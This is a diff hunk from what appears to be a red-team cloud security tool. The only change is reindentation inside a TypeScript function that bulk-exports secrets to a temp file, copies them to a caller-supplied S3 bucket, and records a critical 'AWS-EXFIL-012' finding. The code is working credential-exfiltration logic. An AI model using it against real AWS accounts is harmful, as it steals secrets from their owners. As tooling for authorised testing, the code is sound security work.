@@ -1385,23 +1385,21 @@ export async function secretsBulkExport(args: string[], timeout: number): Promis
     const tmpFile = `${tmpDir}/cs-secrets-export.${format === "json" ? "json" : "env"}`
     await Bun.write(tmpFile, exportData)
     try {
-
-    const key = `secrets-export-${Date.now().toString(36)}.${format === "json" ? "json" : "env"}`
-    const upload = await aws(["s3", "cp", tmpFile, `s3://${destBucket}/${key}`], profile, region, timeout)
-    if (upload.exitCode === 0) {
-      output.push(`[+] Exported to s3://${destBucket}/${key}`)
-      findings.push({
-        checkId: "AWS-EXFIL-012",
-        provider: "aws",
-        severity: "critical",
-        status: "STAGED",
-        resource: `s3:${destBucket}:${key}`,
-        title: `Secrets staged to S3: ${destBucket}/${key}`,
-        details: `${count} secrets exported as ${format}`,
-        remediation: `Delete: aws s3 rm s3://${destBucket}/${key}`,
-      })
-    }
-
+      const key = `secrets-export-${Date.now().toString(36)}.${format === "json" ? "json" : "env"}`
+      const upload = await aws(["s3", "cp", tmpFile, `s3://${destBucket}/${key}`], profile, region, timeout)
+      if (upload.exitCode === 0) {
+        output.push(`[+] Exported to s3://${destBucket}/${key}`)
+        findings.push({
+          checkId: "AWS-EXFIL-012",
+          provider: "aws",
+          severity: "critical",
+          status: "STAGED",
+          resource: `s3:${destBucket}:${key}`,
+          title: `Secrets staged to S3: ${destBucket}/${key}`,
+          details: `${count} secrets exported as ${format}`,
+          remediation: `Delete: aws s3 rm s3://${destBucket}/${key}`,
+        })
+      }
     } finally {
       const { unlink } = await import("node:fs/promises")
       await unlink(tmpFile).catch(() => {})
